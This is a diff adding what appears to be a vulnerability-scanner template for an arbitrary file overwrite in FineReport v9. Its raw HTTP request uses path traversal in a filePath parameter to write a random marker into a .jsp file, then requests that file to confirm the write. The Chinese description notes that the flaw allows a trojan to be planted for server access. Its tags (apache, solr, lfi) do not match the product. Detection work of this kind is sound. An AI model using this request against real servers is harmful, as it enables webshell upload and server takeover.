@@ -1,0 +1,36 @@
+id: fine-report-v9-arbitrary-file-overwrite
+
+info:
+  name: FineReport v9 Arbitrary File Overwrite
+  author: SleepingBag945
+  severity: critical
+  description: 由于在初始化svg文件时，未对传入的参数做限制，导致可以对已存在的文件覆盖写入数据，从而通过将木马写入jsp文件中获取服务器权限
+  reference:
+    - https://github.com/NHPT/WebReportV9Exp/blob/main/WebReport_Exp.py
+  tags: apache,solr,lfi
+
+
+http:
+  - raw:
+      - |
+        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type:text/xml;charset=UTF-8
+
+        __CONTENT__={{randstr}}&__CHARSET__=UTF-8
+
+      - |
+        GET /WebReport/a.svg.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+
+      - type: status
+        status:
+          - 200
+
+
